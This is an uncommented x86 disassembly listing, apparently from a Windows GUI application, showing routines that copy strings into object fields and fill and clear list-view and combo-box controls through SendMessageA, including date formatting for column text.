lea ecx [ esp + 0x164 ]
push ecx
lea ecx [ esi + 0x2a0 ]
call sub_442281
lea edx [ esp + 0x168 ]
lea ecx [ esi + 0x274 ]
push edx
call sub_442281
lea eax [ esp + 0x16c ]
lea ecx [ esi + 0x2ac ]
push eax
call sub_442281
mov ecx [ esp + 0x170 ]
mov edx [ esp + 0x174 ]
mov eax [ esp + 0x178 ]
mov [ esi + 0x29c ] ecx
lea ecx [ esp + 0x17c ]
mov [ esi + 0x290 ] edx
push ecx
lea ecx [ esi + 0x298 ]
mov [ esi + 0x294 ] eax
call sub_442281
lea edx [ esp + 0x180 ]
lea ecx [ esi + 0x2d8 ]
push edx
call sub_442281
lea eax [ esp + 0x184 ]
lea ecx [ esi + 0x2dc ]
push eax
call sub_442281
lea ecx [ esp + 0x188 ]
lea ebp [ esi + 0x2e0 ]
push ecx
mov ecx ebp
call sub_442281
lea edx [ esp + 0x18c ]
lea ecx [ esi + 0x2e4 ]
push edx
call sub_442281
lea eax [ esp + 0x190 ]
lea ecx [ esi + 0x2e8 ]
push eax
call sub_442281
lea ecx [ esp + 0x194 ]
push ecx
mov ecx ebp
call sub_442281
lea edx [ esp + 0x198 ]
lea ecx [ esi + 0x2b0 ]
push edx
call sub_442281
lea eax [ esp + 0x19c ]
lea ecx [ esi + 0x284 ]
push eax
call sub_442281
lea ecx [ esp + 0x1a0 ]
push ecx
lea ecx [ esi + 0x278 ]
call sub_442281
lea edx [ esp + 0x1a4 ]
lea ecx [ esi + 0x2a4 ]
push edx
call sub_442281
lea eax [ esp + 0x1a8 ]
lea ecx [ esi + 0x2c0 ]
push eax
call sub_442281
lea ecx [ esp + 0x1ac ]
push ecx
lea ecx [ esi + 0x2c4 ]
call sub_442281
lea edx [ esp + 0x1b0 ]
lea ecx [ esi + 0x2c8 ]
push edx
call sub_442281
lea eax [ esp + 0x1b4 ]
lea ecx [ esi + 0x28c ]
push eax
call sub_442281
lea ecx [ esp + 0x1b8 ]
push ecx
lea ecx [ esi + 0x280 ]
call sub_442281
lea edx [ esp + 0x1bc ]
lea ecx [ esi + 0x288 ]
push edx
call sub_442281
lea eax [ esp + 0x1c0 ]
lea ecx [ esi + 0x340 ]
push eax
call sub_442281
lea ecx [ esp + 0x1c4 ]
push ecx
lea ecx [ esi + 0x344 ]
call sub_442281
lea edx [ esp + 0x1c8 ]
lea ecx [ esi + 0x348 ]
push edx
call sub_442281
lea eax [ esp + 0x1cc ]
lea ecx [ esi + 0x34c ]
push eax
call sub_442281
lea ecx [ esp + 0x1d0 ]
push ecx
lea ecx [ esi + 0x350 ]
call sub_442281
lea edx [ esp + 0x1d4 ]
lea ecx [ esi + 0x354 ]
push edx
call sub_442281
lea eax [ esp + 0x1d8 ]
lea ecx [ esi + 0x328 ]
push eax
call sub_442281
lea ecx [ esp + 0x1dc ]
push ecx
lea ecx [ esi + 0x32c ]
call sub_442281
lea edx [ esp + 0x1e0 ]
lea ecx [ esi + 0x330 ]
push edx
call sub_442281
lea eax [ esp + 0x1e4 ]
lea ecx [ esi + 0x334 ]
push eax
call sub_442281
lea ecx [ esp + 0x1e8 ]
push ecx
lea ecx [ esi + 0x338 ]
call sub_442281
lea edx [ esp + 0x1ec ]
lea ecx [ esi + 0x33c ]
push edx
call sub_442281
lea eax [ esp + 0x1f0 ]
lea ecx [ esi + 0x2f0 ]
push eax
call sub_442281
lea ecx [ esp + 0x1f4 ]
push ecx
lea ecx [ esi + 0x2f4 ]
call sub_442281
lea edx [ esp + 0x1f8 ]
lea ecx [ esi + 0x2f8 ]
push edx
call sub_442281
lea eax [ esp + 0x1fc ]
lea ecx [ esi + 0x27c ]
push eax
call sub_442281
lea ecx [ esp + 0x200 ]
push ecx
lea ecx [ esi + 0x2cc ]
call sub_442281
lea edx [ esp + 0x204 ]
lea ecx [ esi + 0x2d0 ]
push edx
call sub_442281
lea eax [ esp + 0x208 ]
lea ecx [ esi + 0x2d4 ]
push eax
call sub_442281
lea ecx [ esp + 0x20c ]
push ecx
lea ecx [ esi + 0x2a8 ]
call sub_442281
lea edx [ esp + 0x210 ]
lea ecx [ esi + 0x2b4 ]
push edx
call sub_442281
lea eax [ esp + 0x214 ]
lea ecx [ esi + 0x2b8 ]
push eax
call sub_442281
lea ecx [ esp + 0x218 ]
push ecx
lea ecx [ esi + 0x2bc ]
call sub_442281
lea edx [ esp + 0x21c ]
lea ecx [ esi + 0x358 ]
push edx
call sub_442281
lea eax [ esp + 0x220 ]
lea ecx [ esi + 0x35c ]
push eax
call sub_442281
lea ecx [ esp + 0x224 ]
push ecx
lea ecx [ esi + 0x360 ]
call sub_442281
lea edx [ esp + 0x228 ]
lea ecx [ esi + 0x364 ]
push edx
call sub_442281
lea eax [ esp + 0x22c ]
lea ecx [ esi + 0x368 ]
push eax
call sub_442281
lea ecx [ esp + 0x230 ]
push ecx
lea ecx [ esi + 0x36c ]
call sub_442281
lea edx [ esp + 0x234 ]
lea ecx [ esi + 0x2fc ]
push edx
call sub_442281
lea eax [ esp + 0x238 ]
lea ecx [ esi + 0x320 ]
push eax
call sub_442281
lea ecx [ esp + 0x23c ]
push ecx
lea ecx [ esi + 0x300 ]
call sub_442281
lea edx [ esp + 0x240 ]
lea ecx [ esi + 0x304 ]
push edx
call sub_442281
lea eax [ esp + 0x244 ]
lea ecx [ esi + 0x308 ]
push eax
call sub_442281
lea ecx [ esp + 0x248 ]
push ecx
lea ecx [ esi + 0x30c ]
call sub_442281
lea edx [ esp + 0x24c ]
lea ecx [ esi + 0x310 ]
push edx
call sub_442281
lea eax [ esp + 0x250 ]
lea ecx [ esi + 0x314 ]
push eax
call sub_442281
lea ecx [ esp + 0x254 ]
push ecx
lea ecx [ esi + 0x318 ]
call sub_442281
lea edx [ esp + 0x258 ]
lea ecx [ esi + 0x31c ]
push edx
call sub_442281
lea eax [ esp + 0x25c ]
lea ecx [ esi + 0x268 ]
push eax
call sub_442281
lea ecx [ esp + 0x260 ]
push ecx
lea ecx [ esi + 0x26c ]
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x28 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
push rw-data
lea ecx [ esp + 0x14 ]
call sub_4422d1
push ecx
lea edx [ esp + 0x14 ]
mov ecx esp
mov [ esp + 0x26c ] esp
push edx
call sub_441ebd
mov ecx esi
call sub_41c040
lea ecx [ esp + 0x10 ]
mov [ esp + 0x274 ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0x274 ] bl
call sub_442148
lea ecx [ esp + 0x260 ]
mov [ esp + 0x274 ] 0x86
call sub_442148
lea ecx [ esp + 0x25c ]
mov [ esp + 0x274 ] 0x85
call sub_442148
mov [ esp + 0x274 ] 0x84
lea ecx [ esp + 0x258 ]
call sub_442148
lea ecx [ esp + 0x254 ]
mov [ esp + 0x274 ] 0x83
call sub_442148
lea ecx [ esp + 0x250 ]
mov [ esp + 0x274 ] 0x82
call sub_442148
lea ecx [ esp + 0x24c ]
mov [ esp + 0x274 ] 0x81
call sub_442148
lea ecx [ esp + 0x248 ]
mov [ esp + 0x274 ] 0x80
call sub_442148
lea ecx [ esp + 0x244 ]
mov [ esp + 0x274 ] 0x7f
call sub_442148
lea ecx [ esp + 0x240 ]
mov [ esp + 0x274 ] 0x7e
call sub_442148
lea ecx [ esp + 0x23c ]
mov [ esp + 0x274 ] 0x7d
call sub_442148
lea ecx [ esp + 0x238 ]
mov [ esp + 0x274 ] 0x7c
call sub_442148
lea ecx [ esp + 0x234 ]
mov [ esp + 0x274 ] 0x7b
call sub_442148
lea ecx [ esp + 0x230 ]
mov [ esp + 0x274 ] 0x7a
call sub_442148
lea ecx [ esp + 0x22c ]
mov [ esp + 0x274 ] 0x79
call sub_442148
lea ecx [ esp + 0x228 ]
mov [ esp + 0x274 ] 0x78
call sub_442148
lea ecx [ esp + 0x224 ]
mov [ esp + 0x274 ] 0x77
call sub_442148
lea ecx [ esp + 0x220 ]
mov [ esp + 0x274 ] 0x76
call sub_442148
lea ecx [ esp + 0x21c ]
mov [ esp + 0x274 ] 0x75
call sub_442148
lea ecx [ esp + 0x218 ]
mov [ esp + 0x274 ] 0x74
call sub_442148
lea ecx [ esp + 0x214 ]
mov [ esp + 0x274 ] 0x73
call sub_442148
lea ecx [ esp + 0x210 ]
mov [ esp + 0x274 ] 0x72
call sub_442148
lea ecx [ esp + 0x20c ]
mov [ esp + 0x274 ] 0x71
call sub_442148
lea ecx [ esp + 0x208 ]
mov [ esp + 0x274 ] 0x70
call sub_442148
lea ecx [ esp + 0x204 ]
mov [ esp + 0x274 ] 0x6f
call sub_442148
lea ecx [ esp + 0x200 ]
mov [ esp + 0x274 ] 0x6e
call sub_442148
lea ecx [ esp + 0x1fc ]
mov [ esp + 0x274 ] 0x6d
call sub_442148
lea ecx [ esp + 0x1f8 ]
mov [ esp + 0x274 ] 0x6c
call sub_442148
lea ecx [ esp + 0x1f4 ]
mov [ esp + 0x274 ] 0x6b
call sub_442148
lea ecx [ esp + 0x1f0 ]
mov [ esp + 0x274 ] 0x6a
call sub_442148
mov [ esp + 0x274 ] 0x69
lea ecx [ esp + 0x1ec ]
call sub_442148
lea ecx [ esp + 0x1e8 ]
mov [ esp + 0x274 ] 0x68
call sub_442148
lea ecx [ esp + 0x1e4 ]
mov [ esp + 0x274 ] 0x67
call sub_442148
lea ecx [ esp + 0x1e0 ]
mov [ esp + 0x274 ] 0x66
call sub_442148
lea ecx [ esp + 0x1dc ]
mov [ esp + 0x274 ] 0x65
call sub_442148
lea ecx [ esp + 0x1d8 ]
mov [ esp + 0x274 ] 0x64
call sub_442148
lea ecx [ esp + 0x1d4 ]
mov [ esp + 0x274 ] 0x63
call sub_442148
lea ecx [ esp + 0x1d0 ]
mov [ esp + 0x274 ] 0x62
call sub_442148
lea ecx [ esp + 0x1cc ]
mov [ esp + 0x274 ] 0x61
call sub_442148
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x274 ] 0x60
call sub_442148
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x274 ] 0x5f
call sub_442148
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x274 ] 0x5e
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x274 ] 0x5d
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x274 ] 0x5c
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x274 ] 0x5b
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x274 ] 0x5a
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x274 ] 0x59
call sub_442148
lea ecx [ esp + 0x1a8 ]
mov [ esp + 0x274 ] 0x58
call sub_442148
lea ecx [ esp + 0x1a4 ]
mov [ esp + 0x274 ] 0x57
call sub_442148
lea ecx [ esp + 0x1a0 ]
mov [ esp + 0x274 ] 0x56
call sub_442148
lea ecx [ esp + 0x19c ]
mov [ esp + 0x274 ] 0x55
call sub_442148
lea ecx [ esp + 0x198 ]
mov [ esp + 0x274 ] 0x54
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x274 ] 0x53
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x274 ] 0x52
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x274 ] 0x51
call sub_442148
lea ecx [ esp + 0x188 ]
mov [ esp + 0x274 ] 0x50
call sub_442148
lea ecx [ esp + 0x184 ]
mov [ esp + 0x274 ] 0x4f
call sub_442148
mov [ esp + 0x274 ] 0x4e
lea ecx [ esp + 0x180 ]
call sub_442148
lea ecx [ esp + 0x17c ]
mov [ esp + 0x274 ] 0x4d
call sub_442148
lea ecx [ esp + 0x16c ]
mov [ esp + 0x274 ] 0x4c
call sub_442148
lea ecx [ esp + 0x168 ]
mov [ esp + 0x274 ] 0x4b
call sub_442148
lea ecx [ esp + 0x164 ]
mov [ esp + 0x274 ] 0x4a
call sub_442148
lea ecx [ esp + 0x160 ]
mov [ esp + 0x274 ] 0x49
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x274 ] 0x48
call sub_44f0ac
lea ecx [ esp + 0xe8 ]
mov [ esp + 0x274 ] 0x47
call sub_44f0ac
lea ecx [ esp + 0xac ]
mov [ esp + 0x274 ] 0x46
call sub_44f0ac
mov [ esp + 0x274 ] 0x45
mov ecx [ esp + 0x26c ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x268
retn
sub_41b700
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_461ef0
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push esi
push edi
mov edi ecx
push 0x0
push 0x0
push 0x1042
mov eax [ edi + 0x78 ]
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ edi + 0x5c ]
mov [ esp + 0x28 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x28 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ edi + 0x158 ]
lea esi [ edi + 0x158 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0x18
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x2c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
push rw-data
lea ecx [ esp + 0xc ]
call sub_4422d1
push ecx
lea edx [ esp + 0xc ]
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
call sub_441ebd
mov ecx edi
call sub_41c040
push eax
push eax
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x18
retn
sub_41b820
push 0xffffffff
push sub_461f16
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x258
push esi
mov esi ecx
push 0x0
lea ecx [ esp + 0xc ]
call sub_41c380
push 0x1
mov ecx esi
mov [ esp + 0x268 ] 0x0
call sub_440b18
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
test eax eax
push 0x0
jge r-xdata
lea ecx [ esp + 0x8 ]
push eax
push ecx
lea ecx [ esi + 0x5c ]
call sub_43c1f0
push eax
lea ecx [ esp + 0x254 ]
mov [ esp + 0x268 ] 0x1
call sub_442281
lea ecx [ esp + 0x4 ]
mov [ esp + 0x264 ] 0x0
call sub_442148
lea ecx [ esp + 0x8 ]
call sub_43de8a
push 0x0
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x264 ] 0xffffffff
call sub_41a1f0
mov ecx [ esp + 0x25c ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x264
retn
sub_41b8f0
push 0xffffffff
push sub_461f7c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x124
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov ecx [ esi + 0xb4 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push ecx
mov [ esp + 0x148 ] 0x0
call edi
test eax eax
jle r-xdata
mov eax [ esi + 0x12c ]
push 0x0
push 0x0
push 0x146
push eax
call edi
test eax eax
jle r-xdata
mov ebp eax
push 0x0
lea ecx [ esp + 0x14 ]
call sub_413100
mov edx [ esi + 0x150 ]
lea eax [ esp + 0xc ]
push edx
push rw-data
push eax
mov [ esp + 0x144 ] 0x1
call sub_43b5cc
mov ecx [ esp + 0x18 ]
add esp 0xc
or ebp 0xffffffff
push 0x0
push ecx
push ebp
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov ebp eax
mov edx [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x144
push edx
call edi
dec ebp
jne r-xdata
mov eax [ esp + 0xd8 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x12c ]
mov [ esp + 0x138 ] 0x5
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x138 ] 0x4
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x138 ] 0x3
call sub_442148
mov [ esp + 0x138 ] 0x2
jmp r-xdata
mov ecx [ esi + 0x12c ]
push 0x0
push 0x0
push 0x144
push ecx
call edi
dec ebp
jne r-xdata
lea ecx [ esp + 0x10 ]
call sub_421900
lea ecx [ esp + 0x12c ]
mov [ esp + 0x138 ] 0x9
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x138 ] 0x8
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x138 ] 0x7
call sub_442148
mov [ esp + 0x138 ] 0x6
mov edx [ esp + 0x124 ]
mov eax [ esi + 0xb4 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x120 ]
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x138 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x138 ] ebp
call sub_442148
mov ecx [ esp + 0x130 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x130
retn
sub_41bb00
push 0xffffffff
push sub_46200c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x12c
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov ecx [ esi + 0x12c ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push ecx
mov [ esp + 0x150 ] 0x0
call edi
test eax eax
jle r-xdata
push 0x0
lea ecx [ esp + 0x14 ]
call sub_40a470
mov eax [ esi + 0x154 ]
mov ecx [ esi + 0x150 ]
push eax
push ecx
lea edx [ esp + 0x14 ]
push rw-data
push edx
mov [ esp + 0x150 ] 0x1
call sub_43b5cc
mov eax [ esp + 0x1c ]
add esp 0x10
or ebp 0xffffffff
lea ecx [ esp + 0x10 ]
push 0x0
push eax
push ebp
call sub_42182c
test eax eax
jne r-xdata
mov ebp eax
mov eax [ esp + 0xd8 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x134 ]
mov [ esp + 0x140 ] 0x7
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x140 ] 0x6
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x140 ] 0x5
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x140 ] 0x4
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x140 ] 0x3
call sub_442148
mov [ esp + 0x140 ] 0x2
jmp r-xdata
mov edx [ esi + 0x12c ]
push 0x0
push 0x0
push 0x144
push edx
call edi
dec ebp
jne r-xdata
lea ecx [ esp + 0x10 ]
call sub_421900
lea ecx [ esp + 0x134 ]
mov [ esp + 0x140 ] 0xd
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x140 ] 0xc
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x140 ] 0xb
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x140 ] 0xa
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x140 ] 0x9
call sub_442148
mov [ esp + 0x140 ] 0x8
mov ecx [ esp + 0x124 ]
mov edx [ esi + 0x12c ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ eax + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x120 ]
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x140 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x140 ] ebp
call sub_442148
mov ecx [ esp + 0x138 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
sub_41bd40
push ebx
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0xb4 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push eax
call edi
test eax eax
jle r-xdata
mov edx [ esi + 0x12c ]
push 0x0
push 0x0
push 0x146
push edx
call edi
test eax eax
jle r-xdata
mov ebx eax
pop edi
pop esi
pop ebx
retn
mov ebx eax
mov ecx [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x144
push ecx
call edi
dec ebx
jne r-xdata
mov eax [ esi + 0x12c ]
push 0x0
push 0x0
push 0x144
push eax
call edi
dec ebx
jne r-xdata
sub_41bdb0
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x12c ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push eax
call edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
push ebx
mov ebx eax
mov ecx [ esi + 0x12c ]
push 0x0
push 0x0
push 0x144
push ecx
call edi
dec ebx
jne r-xdata
pop ebx
sub_41be00
push 0xffffffff
push sub_462050
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
mov [ esp + 0x24 ] 0x0
mov [ esp + 0xc ] eax
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0x1
call sub_4422d1
mov eax [ esi + 0x150 ]
push rw-data
push eax
xor edi edi
call sub_42d51e
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0x154 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0x150 ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
call sub_43b5cc
add esp 0xc
mov edi 0x1
mov eax [ esi + 0x14c ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
jne r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x154 ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
call sub_43b5cc
add esp 0xc
mov edx [ esi + 0x154 ]
lea eax [ esp + 0xc ]
push edx
push rw-data
push eax
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x14 ]
push rw-data
push ecx
push edx
call sub_4423dd
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push eax
push edx
mov [ esp + 0x30 ] 0x2
call sub_442377
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x28 ] 0x3
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x24 ] 0x2
call sub_442148
lea ecx [ esp + 0x14 ]
mov [ esp + 0x24 ] 0x1
call sub_442148
jmp r-xdata
push ecx
lea edx [ esp + 0xc ]
mov ecx esp
mov [ esp + 0x1c ] esp
push edx
call sub_441ebd
mov ecx esi
call sub_41c040
lea ecx [ esp + 0xc ]
mov [ esp + 0x24 ] 0x0
call sub_442148
lea ecx [ esp + 0x8 ]
mov [ esp + 0x24 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x1c ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x20
retn
push rw-data
lea ecx [ esp + 0xc ]
call sub_4422d1
mov eax [ esi + 0x14c ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
call sub_43b5cc
add esp 0xc
jmp r-xdata
mov edx [ esi + 0x14c ]
lea eax [ esp + 0xc ]
push edx
push rw-data
push eax
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x10 ]
push rw-data
push ecx
push edx
call sub_4423dd
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x14 ]
push ecx
push eax
push edx
mov [ esp + 0x30 ] 0x4
call sub_442377
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x28 ] 0x5
call sub_442281
lea ecx [ esp + 0x14 ]
mov [ esp + 0x24 ] 0x4
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x24 ] 0x1
call sub_442148
jmp r-xdata
mov edi 0x1
sub_41c040
push 0xffffffff
push sub_462070
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebp
push esi
push edi
mov ebp ecx
mov eax [ ebp + 0x78 ]
mov edi [ SendMessageA@IAT ]
xor esi esi
push esi
push esi
push 0x1009
push eax
mov [ esp + 0x2c ] esi
call edi
mov ecx [ ebp + 0x78 ]
push esi
push esi
push 0xb
push ecx
call edi
push 0x1
mov ecx ebp
call sub_440b18
mov eax [ esp + 0x24 ]
mov edx [ ebp + 0x158 ]
lea ecx [ ebp + 0x158 ]
push esi
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ esp + 0xc ] ecx
mov eax [ ebp + 0x220 ]
mov [ esp + 0x1c ] 0x1
cmp eax esi
jne r-xdata
push esi
push rw-data
push rw-data
mov ecx ebp
call sub_43fe9c
jmp r-xdata
mov eax [ ebp + 0x158 ]
lea ecx [ ebp + 0x158 ]
call [ eax + 0x10 ]
mov ecx [ ebp + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call edi
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0x0
call sub_442148
push ebx
lea edi [ ebp + 0x5c ]
lea ecx [ esp + 0x24 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x4
mov eax [ ebp + 0x268 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push esi
push 0x1
mov ecx edi
call sub_43c179
mov eax [ ebp + 0x26c ]
mov ecx edi
push eax
push 0x1
push esi
call sub_43c1c5
mov eax [ ebp + 0x280 ]
mov ecx edi
push eax
push 0x2
push esi
call sub_43c1c5
mov eax [ ebp + 0x274 ]
mov ecx edi
push eax
push 0x3
push esi
call sub_43c1c5
lea ebx [ ebp + 0x29c ]
push 0x0
mov ecx ebx
call sub_43b6c3
mov edx [ eax + 0xc ]
push 0x0
mov ecx ebx
mov [ esp + 0x18 ] edx
call sub_43b6c3
mov ebx [ eax + 0x10 ]
push 0x0
lea ecx [ ebp + 0x29c ]
inc ebx
call sub_43b6c3
mov eax [ eax + 0x14 ]
mov ecx [ esp + 0x14 ]
add eax 0x76c
push ecx
push ebx
push eax
lea edx [ esp + 0x1c ]
push rw-data
push edx
call sub_43b5cc
mov eax [ esp + 0x24 ]
add esp 0x14
mov ecx edi
push eax
push 0x4
push esi
call sub_43c1c5
mov eax [ ebp + 0x278 ]
mov ecx edi
push eax
push 0x5
push esi
call sub_43c1c5
mov eax [ ebp + 0x27c ]
mov ecx edi
push eax
push 0x6
push esi
call sub_43c1c5
mov eax [ ebp + 0x28c ]
mov ecx edi
push eax
push 0x7
push esi
call sub_43c1c5
mov eax [ ebp + 0x284 ]
push eax
push 0x8
push esi
mov ecx edi
call sub_43c1c5
mov eax [ ebp + 0x288 ]
mov ecx edi
push eax
push 0x9
push esi
call sub_43c1c5
mov eax [ ebp + 0x2a8 ]
mov ecx edi
push eax
push 0xa
push esi
call sub_43c1c5
mov eax [ ebp + 0x298 ]
mov ecx edi
push eax
push 0xb
push esi
call sub_43c1c5
mov eax [ ebp + 0x2a4 ]
mov ecx edi
push eax
push 0xc
push esi
call sub_43c1c5
lea ebx [ ebp + 0x290 ]
push 0x0
mov ecx ebx
call sub_43b6c3
mov ecx [ eax + 0xc ]
push 0x0
mov [ esp + 0x18 ] ecx
mov ecx ebx
call sub_43b6c3
mov ebx [ eax + 0x10 ]
push 0x0
lea ecx [ ebp + 0x290 ]
inc ebx
call sub_43b6c3
mov eax [ eax + 0x14 ]
mov edx [ esp + 0x14 ]
add eax 0x76c
push edx
push ebx
push eax
lea eax [ esp + 0x1c ]
push rw-data
push eax
call sub_43b5cc
mov ecx [ esp + 0x24 ]
add esp 0x14
push ecx
push 0xd
push esi
mov ecx edi
call sub_43c1c5
lea ebx [ ebp + 0x294 ]
push 0x0
mov ecx ebx
call sub_43b6c3
mov edx [ eax + 0xc ]
push 0x0
mov ecx ebx
mov [ esp + 0x18 ] edx
call sub_43b6c3
mov ebx [ eax + 0x10 ]
push 0x0
lea ecx [ ebp + 0x294 ]
inc ebx
call sub_43b6c3
mov eax [ eax + 0x14 ]
mov ecx [ esp + 0x14 ]
add eax 0x76c
push ecx
push ebx
push eax
lea edx [ esp + 0x1c ]
push rw-data
push edx
call sub_43b5cc
mov eax [ esp + 0x24 ]
add esp 0x14
mov ecx edi
push eax
push 0xe
push esi
call sub_43c1c5
